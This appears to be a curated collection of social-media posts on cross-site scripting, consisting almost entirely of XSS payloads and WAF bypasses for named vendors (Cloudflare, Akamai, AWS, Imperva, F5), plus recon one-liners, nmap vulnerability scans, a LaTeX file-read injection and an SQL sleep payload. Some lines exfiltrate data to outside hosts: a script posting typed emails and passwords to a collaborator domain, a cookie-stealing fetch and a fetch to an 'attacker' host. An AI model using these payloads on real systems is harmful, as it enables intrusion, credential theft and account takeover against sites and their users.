# X 语料 · XSS 跨站脚本（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XSS](../by-type/xss.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-xss-2（300 条）、x-xss-3（266 条）、x-exp-xss（209 条）、x-residual-xss（111 条） · 本文 1,117 行

- An useful XSS filter bypass technique I use when everything is not working is to take the closing tag off eg. hhh<img src="#" onmouseenter="prompt('XSS')" gggg
- When you build xss payload
  xxx";document.getElementById("idname").innerHTML=document.write(alert(1))//"
- Encountered with AWS WAF?
  Just add "<!" (without quotes) before your payload and bypass that WAF. :)
  eg: <!<script>alert(1)</script>
- <b"/onauxclick='-alert(1);'>XXS
  The payload will run in all the context.
  Eg -
  <input type="text" value="<b"/onauxclick='-alert(1);'>XXS">
  <b"/onauxclick='-alert(2);'>XXS
  <script>
  var test='<b"/onauxclick='-alert(3);'>TEST';
  </script>
- Payload will run in a lot of contexts.
  javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
  Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.
- When injecting into src attributes, you need a javascript URI payload! Here is a good payload I created using a load of linefeeds to bypass WAF:
  %0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
  Work with link + iframe
- Here is my obfuscated payload. It bypasses lots of WAF, including CloudFlare iirc.
  <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
  iFrame with javascript URI payload. Line feeds [CRLF] obfuscate it.
- When injecting inside an input tag and you can't get onfocus because the box is hidden try this payload:
  accesskey="X" onclick="alert(0)"
  Works on FireFox if a user presses ALT + SHIFT + X.
- waf xss bypass payload:
  <--`%20--!>
- Sometimes user input is reflected into a value without any quotations.
  Eg:<input value={input}>
  Just add a space and you can now inject onfocus=alert(0) autofocus for XSS! Works even against htmlspecialchars().
- Here's a payload that proves using regex/javascript to prevent XSS is a bad idea:
  <xmp><p title="</xmp><script>alert(0)</script>">
  Script tags not encoded as regex assumes it's inside p tag. But p isn't a tag as html in xmp tags is text.
- Recently bypassed a strict and unknown WAF with below payload -
  param=XSS"%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//
- When it comes to CyberSec sometimes adding more security measures creates the vulnerability.
  For example, site blocks <script> tags entirely, but strips 'alert' just in case. Now <scralertiot> isn't blocked, but then it strips alert.
- <details/open%0Aontoggle%0D=prom\u0070t`${d\u006fcument['coo'.concat`kie`]}`>
- XSS In Ascii Enconding
  ¼script¾alert(¢XSS¢)¼/script¾
  This Payload is more useful for waf evasion than server side filter evasion.
- is there any xss payload special character after event handler(except "=" and "space")
  The payload I know contains all "=" or "space" after the event handler
  <svg </onload ="1> (_=prompt,_(45)) "">
  <d3/onmouseenter=[2].find(confirm)>z
  <x oncut=alert()>x
- If you have your input reflecting in a javascript variable simply close the context with </script> and start a new <script> tag for xss
- Replace alert(0) with prompt `0` in payloads — it raises the chance of a successful XSS.
- Instead of always using  why not try:
  <audio src=x onerror=alert(0)>
  <video src=x onerror=alert(0)>
  Or my favorite:
  <script src=x onerror=alert(0)>
- onload* (only firefox)
  details: https://hahwul.com/2019/08/onloadstartend-event-handler-xss-only-firefox.html…
- According to RFC5322 "<script>alert(1)</script>"@gmail.com is a valid e-mail address; it is also a valid payload wherever an address is reflected.
- "><svg/;onload="alert(45)"onload=alert(45)>">
  detail: https://hahwul.com/2019/08/bypass-blankslash-filter-for-xss-to-simple-trick.html…
- If you got an open redirection payload that says "Redirecting to xxxx", make sure to try XSS in the field.
  OR
  sushi[dot]com?redirect=google[dot]com
  XSS
  sushi[dot]com?redirect=javascript:alert(1)
- Also a good tip if you're testing community based apps:
  1. Spray blind XSS (everywhere, also headers)
  2. Report your account
  3. And wait :)
- If a application replace some HTML tags such as <h1> with nothing and blocking some like <script>... Try insert the replaced tag inside on blocked tag:
  <<h1>abc</h1>script>alert(1);</<h1>abc</h1>script> will be <script>alert(1);</script>
- In(caps)ula XSS bypass:
  a(<svg/onload=obfuscated_js>)
  Example obfuscation method: http://aem1k.com/aurebesh.js/#
- Parameter pollution is reflected as an array:
  redacted\.com/something/?par1=aaa&par1=bbb
  Response:
  ["aaa", "bbb"]
  (no injection achieved — no sqli / xss / ssti / error)
- Here's an XSS bypass I used to bypass some filters.
  <video+src=0+onerror=http://eval.call`${'alert\x28document.cookie\x29'}`><!--
- <input onfocus=alert(0) autofocus>
  autofocus on the payload itself is what executes it on render.
- Akamai WAF Bypass (no character filtering)
  <svg onauxclick='a=alert;b=document;a(b.domain)'>
- Simple payloads can still win: "> triggered on a preview page, the only page in the app without filtering.
- Escaping from a function in JS context for XSS:
  XSS';}alert(1);function r(){s='
  - terminate string and close out the first function
  - call the alert
  - balance the remaining quote and '}' (for example).
- The application was sanitizing alert, script, ", etc — bypass:
  <svg/onload=prompt (1)>
- When looking for XSS, you may want to know the tag priority of HTML, which can let you escape from the quotation marks.
  These labels:
  \<!--
  \<iframe\>
  \<noframes\>
  \<noscript\>
  \<script\>
  \<style\>
  \<textarea\>
  \<title\>
  \<xmp\>
  Eg:
- XSS bypass with limited input and arbitrary tag. Copy `x` to trigger.
  <x/oncopy=alert()>x
- Cloudflare XSS Bypass Payload
  <svg%0Aonauxclick=0;[1].some(confirm)//
- 1. Enumerate PUBLIC S3 buckets with https://github.com/hehnope/slurp
  2. Write quick script to download all files locally (see comments/photo)
  3. Loot hundreds of PDF/png/js files
  4. Grep through & analyze files
  5: PII info leakage in CV PDF file (1/253 files)
- XSS filter bypass using stripped </div> tags to obfuscate. Multiple P2 stored XSS.
  XSS Payload:
  <</div>script</div>>alert()<</div>/script</div>>
- XSS filter bypass:
  <embed src="javascript%26%63%6f%6c%6f%6e%3balert()">
  The url encoded portion is the html entity for colon:
  &colon;
- after long time i have found xss in private program with XSS polyglot .which can break 20+ context.
  %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
- A safe way to perform XSS:
  <script>console.log('Safe XSS')</script>
  It will pop up in the web console (Control+Shift+I) rather than potentially storing it.
- http://domain.com/somePath returns error page that includes the path? Try http://domain.com/somePath<script>alert(1)</script> just for fun.
- payload for when
  1. a parameter is reflected in javascript
  2. it’s being inserted into the DOM via innerHTML
  3. HTML encoding and not Javascript encoding is used
  4. WAF blocks common payloads
  \x3Ctextarea+onauxclick\x3Dconfirm(1)\x3Eright+click+here
- Atlassian Confluence 3.4.x - Error Page Cross-Site Scripting
  Payload : %3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm
  CVE-2018-5230
  https://exploit-db.com/exploits/37791
- Some lesser known 0-click XSS vectors:
  <object data="data:text/html,<script>alert(5)</script>">
  <iframe srcdoc="<svg onload=alert(4);>">
  <object data=javascript:alert(3)>
  <iframe src=javascript:alert(2)>
  <embed src=javascript:alert(1)>
- bypassing XSS filters:
  I made this 42 chars js func to escape strings:
  s=i=>i.replace(/./g,o=>'&#'+o.charCodeAt())
  s("alert`xss`")
- More uncommon 0-click XSS vectors:
  <details open ontoggle="alert()"> (chrome & opera)
  <video onwaiting=alert() autoplay><source src=x></video> (firefox)
  <style>@keyframes x{}</style><a style="animation-name:x" onanimationend=alert()>
- If an application uses markdown, make sure to test it for xss. I used [Click here](javascript:alert(1)), to create a link via markdown and when the user clicks on Click here, the xss will get executed. Read this article. https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8…
- Neat xss payload required to bypass filters:
  1. No periods allowed
  2. Regex filter on text followed by '('
  Blocking "alert(, confirm(, etc",
  but the self['alert']( got by the filter
  Payload:
  ?t=test'*self['alert'](document['domain'])*'test
- XSS filter bypass using stripped </p> tag to obfuscate.
  P2 stored XSS.
  XSS Payload:
  <</p>iframe src=javascript:alert()//
- XSS filter bypass using multiple reflections & tiny payloads.
  XSS Payloads:
  param A=<script>alert("
  param B=")</script>
  Reflected as:
  <script>alert("some-html")</script>
  This blog post by @brutelogic is the best: https://brutelogic.com.br/blog/multi-reflection-xss/…
- evolution of an xss WAF bypass
  &gt;+src+onerror=confirm&lpar;1&rpar;&lt;
  &gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;
  new tip: try double HTML entity encoding chars???
- <script>alert(1)</script> blocked by waf.
  Let's try <script>alert`1`</script> oops 😅
- If the program replace all user input in the tag (ex: <h1>,<script>,etc.) into blank you can add "Line Feed (%0a)" before closing tag for bypass (ex: <script%0a>,</h1%0a>)
  ex:
  <?php
   echo "You say " . preg_replace("/<(.*?)>/", "", $_GET['x']);
  ?>
- I earned 3 * $350 for my submissions on @bugcrowd. All were stored XSS(P3). The issues were XSS in the markdown editor. Payload used:
   [Click Me](javascript:alert('xss'))
  This post was really helpful:
  https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8…
- XSS WAF Bypass Tip:
  try url encoding the parameter name in your PoC URL!
  ?page=";confirm`1`// ➡️ 302
  ?pag%65=";confirm`1`// ➡️ 200 + XSS!
- XSS payload:
- javascript%0A%3adocument.cookie
  XSS payload to inject in a href link, as the new line on a URL is perfectly fine on HTML, the %0A before %3a bypasses regex checks of "https" and also bypasses @Cloudflare. Should be enough to show impact
- XSS Payload JSON:
  "}]}';alert('oBonito')</script>
- I use google dorks for finding reflected xss.
  site:target[dot]com inurl:&
  site:target[dot]com inurl:php
  site:target[dot]com inurl:jsp
  etc.. and I try find xss ( I don’t use any tool for find them )
- Easy XSS:
  1- Sudomy found http://target2.target.com
  2- nikto found /download
  3- Arjun found trt parameter
  4- My hands entered -->'"/></sCript>
  5- XSS ;D
  Note: ffuf couldn't find /download directory!!!
- Collect endpoints, subdomains with gospider
  gospider -s https://domain.com -d 10 -a -w --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|woff2|svg|js)" | grep -oP "(http[s]?:\/\/)?((-)?[\w+\.]){1,}domain\.com.*"
- This bypasses a lot.
  <math><x xlink:href=javascript:confirm`1`>click
- quoteless XSS filter bypass (removing HTML chars) in an inline JS function with multiple params
  Normal:
  /page?x=1&y=2&z=3
  ⬇️
  <body onload="func('1', '2', '3')">
  XSS:
  /page?x=1&y=%5C&z=);alert(1);//
  ⬇️
  <body onload="func('1', '\', ');alert(1);//'">
- " onclick "
  Interesting event handler.
  You can use nonexist html tag and it works.
  Example:
  <nonexist onclick=alert(1)>ClickMe
  Example on @brutelogic xss lab xss in path.
  http://brutelogic.com.br/xss.php/%22%3E%3Cnonexist%20onclick=alert(1)%3EClickMe…
- Weird XSS payloads::
  <a href=javascript;alert()>Click
  <scri\x00pt>alert(1);</scri%00pt>
   <svg%0Ao%00nload=%09((pro\u006dpt))()//
  <object+data="">
- Simple script to gather all TLDs of a company:
  value=$(echo $1|cut -f1 -d.)
  echo $value
  sed -e "s/^/$value./" /root/wordlist/tld.txt | filter-resolved
  Usage: bash http://script.sh http://example.com
- Quick tip: replacing the bash argument $1 with "${1:-/dev/stdin}"
  it makes u script accept stdin before or after the script. (useful in oneliner command)
- Akamai WAF XSS Payload: <details onauxclick=confirm`xss`></details> Right-Click on 'Details', XSS will be fired.
- Bypassed a strong XSS filter on a private program.
  [ No '>' was allowed , no Html tags, Character length 35 ]
  XSS Payload used :-
  <svg onload="alert(1)" <="" svg=""
- Imperva Waf XSS ByPass :
  Payload : <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
  Codepen : https://codepen.io/tismayil/pen/oNjwRda…
- In some cases adding %03 and the null-byte character's %00 in your payloads can bypass the sinks of DOM sanitizer.
  Payload:
  %00javascript://yeasir.com/%E2%80%A8alert(document.domain)//https://yeasir.com
  Enjoy!
- [XSS]
  Found a weird XSS filter bypass using this payload:
  <style/><script/z>alert(1)</script>">
- Today I bypass F5-Big waf with xss payload.
  Interesting is %5K converted to "P" character.
  In response source I got
  "><P/onweel=alert(1)>mouse wheel here<!--
  Payload:
  %22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--
- [2/3]Payload:<script>setInterval(function(){fetch('https://YOURSUBDOMAINHERE.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.getElementById('email').value+':'+document.getElementById('password').value});},2000);</script>
- If you cannot use these words "alert, prompt, confirm" for XSS, you can try following:
  <svg/onload="window['al'+'ert'](1)">
- Bypassing most FILE Uploads filters for $$$$
  * .htaccess <- upload htaccess
  * file.svg <- uploading svg = xss
  * file.SVg <- must try case mismatch
  * .svg
  *
  * ' or '1'='1
  *
  * file.'svg <- invalid ext.
- Use back ticks instead of parentheses in an XSS payload if parentheses are being sanitised making it harder to call a function.
  alert(0) => alert`0`
- Cloudflare bypass & template injection to XSS in one shoot !
  {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
- Broken Link Checker one-liner:
  Blc() {
  subfinder -d $1 | httprobe | waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | burl | tee brokenlink.txt
  }
  $ blc http://lol.com
- Open Redirect Through HTTP Pollution Attack.
  URL -> sub.dom-co/go/https/dom-co
  1) sub.dom-co/go/https/dom-co.evil-co/
  -> 404
  2) sub.dom-co/go/https/dom-co/go/https/dom-co.evil-co/
  -> Redirected To Evil website
- If WAF or filters block " or ' you can use:
  var a =/XSS bypass/.source
  alert(a)
  Or simply:
  alert (/XSS bypass/.souce)
  to bypass.
  Useful also for other injection bypass btw ;)
  Other cool tricks in the vid
  Credits @Menin_TheMiddle
- Recon site, if server -> windows OS, find open ports. Often see an SMB open port.
  -> locate *.nse | grep smb(Try All)
  -> nmap -p 139,445 --script=smb-vuln* $targetip
  Server might be vuln to any public SMB NSE/Nmap script
  --> RCE
- A payload to bypass WAF with concatenation, by ngkogkos
  onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
- Tienen problemas con filtros xss?
  Intenten hacer su payload dentro de <marquee> y pueden saltar los filtros:
  ❌ <form><button formaction=javascript&colon;alert('xss')>_Y00!_
  ✔️ <marquee><form><button formaction=javascript&colon;alert('xss')>_Y00!_</marquee>
- Bypassed AWS WAF (cloudfront) -
  <xxx/x=">"/onpointerrawupdate=top[8680439..toString(30)]`1`>HOVER_ME
  Rules-
  1. Strict events and tag validation
  2. alert,confirm,prompt not working
  3. space and / was not allowed
  Ref: @PortSwigger XSS cheatsheet2020
- Bypassed CloudFlare WAF -
  %3Ciframe%20src=http://xss.rocks/scriptlet.html%20%3C…
  Rules-
  1. alert,confirm,prompt,onload=,script,iframe not working
  2. ( , ) , space and & was not allowed
  Ref:
   XSS cheatsheet2020
- <script src=//server.com/xss.js> --> nothing
  <script src="(https)://server.com/xss.js"> --> XSS
  With no parenthesis
- LaTex Injection 💥
  1/3
  Read File :
  \input{/etc/passwd} \include{password} # load .tex
  \usepackage{verbatim} \verbatiminput{/etc/passwd}
  Xss @EdOverflow :
  \url{javascript:alert(1)} \href{javascript:alert(1)}{placeholder}
- If the user supplied data is reflected inside double quotes (") within a <script> tag. There is no need of escaping double quotes (") to trigger XSS.
- wordpress WAF bypass
  if
  "><svg onload=prompt(1337)>
  ">
  or any other event handler not working
  use "><scri%0apt>alert(1337)</script>
  {Today worked 2 times}
- Got Stored XSS on a site through file extension.
  uploaded image  was getting converted to  but only magic bytes were checked to validate file type and not extension.
  I used http://file.abc"><svg onload=alert(1)> as file name
- Going of @securinti's awesome NahamCon talk and seeing that emails such as (":<script></script>"@somedomain.com) are actually RFC 822 compliant and some sites may allow you to sign up with that. There is an awesome builtin tool in python... 1/3
- El payload ganador de la semana en
  <script>+-+-1-+-+alert(1)</script>
  <script>+-+-1-+-+alert(/xss/)</script>
- XSSI example PoC to fix JS undefined/type errors
  <script>
  x = function(y, z) { };
  prof = {'manager': {'load':null, 'fn':x}}
  prof.manager.load = function (leaked) {
  alert(JSON.stringify(leaked));
  };
  </script>
  <script src="https://test.com/profile.js"></script>
- You always dont require a webpage to execute an XSS.
  Paste the below code in browser and hit go.
  data:text/html,<html><body>Hello<script>alert("Remembering SSR")</script></body></html>
- Payloads xss para inyectar en correos
  <h1>_Y000!_</h1>@f.c
  <h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>@d.c
  <form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_@d.c
  pueden probar cualquier payload añadiendo @d.c en la parte final
- Cloudflare XSS WAF Bypass
  <svg onx=() onload=(confirm)(1)>
- Use this google dork for getting POCs resources/reports of particular vulnerability easily.
  site: "website name" vulnerability name
  Example 👇
  site: "hackerone" xss
  site: "medium" xss
- I recently discovered a fancy way to execute arbitrary XSS without parenthesses. As far as I am concerned this is a novel technique 😁
  https://terjanq.me/xss.php?js=onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#1/-alert(location.href)/…
- Xss payload
  <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;`&lpar;_Y000!_&rpar;`>
  <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;`_Y000!_`>
- CVE-2019-1010287 (XSS)
  Use this dork: inurl:"/timesheet/login.php"
  Parameter vuln: redirect=
  (POST method)
- Xss payload
  -->'"<h1></h1>
- Ondblclick xss Payloads
  <h1 ondblclick=alert`_Y000!_`>_Y000!_</h1>
  <marquee ondblclick=alert`_Y000!_`>_Y000!_</marquee>
  <xss ondblclick="alert`_Y000!_`" autofocus tabindex=1>_Y000!_</xss>
  <w="/x="y>"/ondblclick=`<`[confir\u006d`_Y000!_`]>z
- one line bash script to get every domain on specific IP
  curl -s -k -X $'GET' -H $'Host: http://rapiddns.io' --url 'https://rapiddns.io/sameip/'$1 | grep "<td><a" | cut -d ">" -f 3 | cut -d "<" -f 1 | grep -v $1
- onXXX -> blocked by WAF
  <a href -> blocked
  <script -> blocked
  <form action=javascript:alert(1)>
  <input type=submit />
  </form>
- onmouseover + Alert Obfuscation + Unicode payloads
  <video src=? onmouseover=t\u006fp[8680439..t\u006fString(30)](`${`Y000!`}`)>
  <video src=? onmouseover=top[/al/.source+/ert/.source](`${`Y000!`}`)>
  <video src=? onmouseover=[(`${`Y000!`}`)].find(alert)>
- If you find a file upload function for an image, try introducing an image with XSS in the filename like so:
  "><svg onmouseover=alert(1)>.svg
- 1. try input payload of xss on form, doesnt work
  2. download sample data (CSV file)
  3. edit value and change it with payload
  4. import the file and you see the magic 🖖
- you can use nmap to discover software version running on the remote host,this command will discover the server software version plus it will run all SSH scripts against the target:
  nmap -sV -p 22 -Pn -T5 --script=ssh* -v 192.168.1.110
- A simple XSS Bypass
  Payload '"></script>
  blocked as : '"> script>
  Bypass: '"><%252fscript>
  Try once if u want😉🙂
- Cookie Stealing all cookies from victim user set by target site. It can’t get cookies protected
  by httpOnly security flag.
  fetch('//xyz.com.br/?c='+document.cookie)
- CSP Bypass (for Whitelisted Google Domains)
  Use when there’s a CSP (Content-Security Policy) that allows execution from these
  domains.
  <script src=https://google.com/complete/search?client=chrome…
  %26jsonp=alert(1);></script>
  <script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js…>
- </script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}
- One Liner for XSS:
  gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o output.txt
- How to obfuscate and "alert()" without parenthesis, back ticks, brackets, quotes, braces, spaces, and more.
  a=8,b=confirm,c=window,c.onerror=b;throw-a
- Xss Payloads
  "
  <svg onload=alert(1)>
  "><svg onload=alert(1)//
  "onmouseover=alert(1)//
  "autofocus/onfocus=alert(1)//
  '-alert(1)-'
  '-alert(1)//
  \'-alert(1)//
  </script><svg onload=alert(1)>
  "
  For more :- https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt…
- Xss in 5 mins.
  {assetfinder -subs-only target | httprobe | waybackurls/gau | gf xss | dalfox pipe}.
- I messed around a bit with StackPath WAF, and from what I learnt, the XSS protections seem to involve:
  <script>.*</script>
  <.*on\w+=
  <a.href=javascript:.*
  So here are 2 simple bypasses:
  <object/data=javascript:alert()>
  <a/href="javascript%0A%0D:alert()">
- Payload:
  </script><script>confirm(document.domain)</script>
- https://github.com/OfJAAH/KingOfBugBountyTips…
  SCRIPT = http://Cert.sh https://ghostbin.co/paste/7zyup
  🔥 xargs -a domain -P1000 -I@ sh -c 'bash http://cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx 🔥
- Steps:
  1. subfinder -d target. com | httprobe -c 100 > target.txt
  2. cat target.txt | waybackurls | gf xss
  3. Got an interesting URL www. target. com/service?name=
  1/2
- 4. Tried name=test123 and it reflected back.
  5. Then name=“><svg onload=prompt(document.domain)> and XSS executed successfully!
  2/2
- This is an interesting trick. Can confuse WAFs into thinking payload is an attribute value.
  <?tag x="-->" test="
- Use google dorks to find other sites of a big company running php:
  Like
  site: "company" "php"
  site: "company" ext:php
  site:http://company.com "php"
  site:http://company.com ext:php
- <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
  (URL decode it first if pasting directly into source)
  http://m0z.altervista.org/iframe.html
- gotta love a fun and easy XSS filter bypass!
  context: JS string
  backslash encoded chars: ' " \ >
  payload: </script+x><script+x>alert(1);//</script+x>
  result:
  <script>
  location = "/home</script x\><script x\>alert(1);//</script x\>";
  </script>
- ** 𝗔𝗸𝗮𝗺𝗮𝗶 [𝗞𝗢𝗡𝗔 𝗦𝗶𝘁𝗲 𝗗𝗲𝗳𝗲𝗻𝗱𝗲𝗿] 𝗪𝗔𝗙 𝗕𝘆𝗽𝗮𝘀𝘀 **
  𝗣𝗮𝘆𝗹𝗼𝗮𝗱: <tiger/onpointerrawupdate=this['innerHTML']=unescape(location.hash);>XSS Me#
- Simple Reflected XSS:-
  1. subfinder -d target .com | httprobe -c 100 > target.txt
  2. cat target.txt | waybackurls | gf xss | kxxs
  3. Got a URL which had all the special characters unfiltered and the parameter was callback=
  1/3
- Check every page of the site, including the privacy policy — that is where the reflection sat.
  qlskk”>xunw3
- XSS bypass with only ' reflected in a <link> tag on a hardened target.
  No spaces, slashes, or control characters.
  XSS Payload:
  'accesskey='x'onclick='(alert)(`TakSec`)';
  On Firefox Win/Linux press ALT+SHIFT+X
- How to use javascripts fetch to exfiltrate data asynchronously in XSS context when "(,),<,>,value" is escaped and oninput the only allowed event handler:
  fetch`https://attacker/${exfil_data_dict}`
- Shodan Dork for CVE-2020-8512
  Server: IceWarp
  Poc:
  http://redacted.comwebmail/?color="><svg/onload=alert`openbugobunty`>
- To check for Big-IP F5 vulnerability with nmap use
  ----------------------------------------------------------
  nmap -iL file.txt --script test_cisco_asa.nse -sV -Pn -vv
  ----------------------------------------------------------
- an XSS payload with script src for short length inputs
  <script src=//⑮.₨></script>
- XSS Using Code Encoding
  encode your script in base64 and place it in META tag. This way we get rid of alert() totally.
  <META HTTP-EQUIV="refresh"
  CONTENT="0;url=">
- gospider -a -s https://site.com -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
- Some payloads that worked for me in popping up a stored XSS:-
  1.
  2. <div/onmouseover='alert(1)'> style="x:">
  3. \";alert('XSS');//
  4. "autofocus/onfocus=alert(1)//
  5. '-alert(1)-'
- Stored XSS -> High
  Payload :
  ">
- Fixed Some Major bugs in Gxss and made it clean.
  echo "http://testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
  [1/2]
  https://github.com/KathanP19/Gxss
- Found on a private program, old but but still functional : WAF bypass with double URL encoding.
  </script><script>alert('XSS here!')</script> => 403
  %253C%252Fscript%253E%253Cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E => 200
- Nothing critical, but here is the PoC for the new CVE I got credited for: CVE-2020-14815.
  https://target[.]com/bi-security-login/login.jsp?msi=false&redirect=">
  Got a couple of Med in H1 using it. Have Fun!
- Got XSS on a site with httpOnly cookie flag, wanna leverage the impact or exploit the xss? Try these,
  1. Steal Csrf token.
  2. Make a password/email change request.
  3. Insert malicious iframe.
  4. Deliver malicious binary.
- XSS inside DIV with 0-click.
  Many times blind XSS can be missed because it's inside the div tag and not auto triggerable. Here's a payload for XSS in div with 0 click
  <div id=x tabindex=1 autofocus onfocus=alert(1)></div>
- an XSS payload with Alert Obfuscation, for bypass RegEx filters
- 1. Time Based SQL Injection : Used payload: '+(select*from(select(sleep(20)))a)+' in phone number parameter value for sign-in endpoint. Don't miss sign-in parameters [Like username, email, otp] for SQLi check.
  2. Reflected XSS + CSRF to Account Takeover : )
- Cross Site Scripting (XSS)
  The input field was removing forward slash '/' which blocked my payload from working.
  Added two forward slashes '//' and bypassed.
  Payload : test"<//script><script>alert(document.domain)</script>
- My favourite payload for popping an alert on an input field is:
  <input onfocus="alert('xss');" autofocus>
  It's pretty elegant how the autofocus parameter automatically executes the onfocus event handler. A symbiotic relationship many WAFs fail to notice.
- Hi Community,
  Recently got XSS by uploading Image with Name as:
  “><img src=x
- Do you know you can use the following file extension as a replacement of `.html` when trying file upload XSS
  .xml, .xsl, .rdf, .svg, .shtml, .htm, .html, .application, .mht, .var
  terms and conditions applied** :P
- an XSS that should be looked at in all upload forms.
  ->*intercept*
  <noscript><p
  about </noscript>:
  https://acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/…
  Example PoC:
- 📢 Today's
  These are some of the shortest XSS's possible:
  1. <script/src=//⑮.rs
  2. <x/oncut=alert(1)>a
  3. <iframe src=//⑮.rs>
- Akamai WAF bypass for => XSS
  <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
- an XSS payload without Alphabetic Characters[alert(1)], for bypass some filters
  <svg/onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()">
- XSS Bypass waf technique :
  param= 8rk3s6%22%3Cimg/**/src%3D%22x%22/**/onx%3D%22%22/**/onerror%3D%22alert%60l0cpd%60%22%3Ef9y60
- This is a good tool to check for Broken Links..
  https://github.com/stevenvachon/broken-link-checker…
  Command to use to find a vulnerable javascript file that might get you Stored XSS:
  blc -r --filter-level 2 domain | grep "\.js" | grep "BROKEN"
- Encountered with AWS WAF? Just add “<!” (without quotes) before your payload and bypass that WAF. :) eg: <!<script>alert(1)</script>
- Web Attack WAF Bypass
  [XSS]
  <audio src=1 onerror=alert(/xss/);>
  <audio src=1 onerror=prompt('xss');>
  <object data=""></object>
  https://freebuf.com/articles/web/254513.html…
- XSS Cloudflare WAF bypass:
- Found stored xss and payload to bypass their rules was
  ">
- A simple XSS Bypass
  Payload '"></script>
  blocked as : '"> script>
  Bypass: '"><%252fscript>
- XSS vector on chat messages inputs
  <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
- 🚨 New CloudFlare XSS Bypass! 🚨 @JacofficenHHax
  <svg onload=alert%26%230000000040"1")>
- <svg/onload =’[][`cons`+`tructor`][`const`+`ructor`](`aler`+`t(1)`)()’>
- Don't forget about setting up your username on every social network to "<script>alert(1)</script>" just in case some website you might be singing it with your account might not properly do filtering or encoding. (Found XSS on a random website this way 😂)
  Wow such
- x=this?.[[]?.x??/a/.source+'\x6c'+13439..toString?.(30)],[1]?.findIndex?.(x);
  This is equivalent to alert(1);.
  Simple code: ([]?.x??alert)(1);
  OWASP XSS Filter Bypass Alert Obfuscation of Mixed Technique Obfuscation - https://sandbox.hack.vet/OptionalChaining.html…
- GlobalProtect XSS
  https://globalprotect/global-protect/login.esp?user=j%22;-alert(1)-%22x
- Cloudflare bypass XSS payloads
  <svg%0Aonauxclick=0;[1].some(confirm)//
- Is this a Firefox bug? (Only Fx is affected.)
  XSS Payload:
  []?.findIndex?.(dump)+('<input onfocus=alert(1) autofocus>');
  A technique for writing to the DOM without using document.write() in Firefox XSS. - https://sandbox.hack.vet/firefoxReturn.html…
- gospider -d 0 -s "https://DOMAIN" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew spider1
  👻
- I found a site-wide, target specific Akamai XSS Bypass last night!
  the word "javascript" is removed in all reflection contexts, which can be abused to craft Akamai bypasses:
  <ijavascriptmg+src+ojavascriptnerror=confirm(1)>
  ⬇️
- How to avoid using the "alert" name.
  Firefox only fired alert(1).
  Object.values(this)[5].call(this, 1)
  Object.values(this)[6].call(this, 1)
  Object.values(this)[7].call(this, 1)
  Some array will hit.
- with(document)name,Object.values(this)[5].call(this, cookie);
  A payload that allows alert(document.cookie) to be executed without using alert() and document.cookie.
  Look for the fx alert() subscript in "Object.values(this)".
- Cloudflare bypass:
  <svg onx=() onload=(confirm)(1)>
  <svg onx=() onload=(confirm)(document.cookie)>
  <svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
- POC :
  1) signup account
  2) add company name = ">
  3 ) Click on done
  4) popup fires
- a Javascript Polyglot for Cross-Site Scripting (XSS)
  <video src=">" onerror=setTimeout`confirm\x281\x29`>
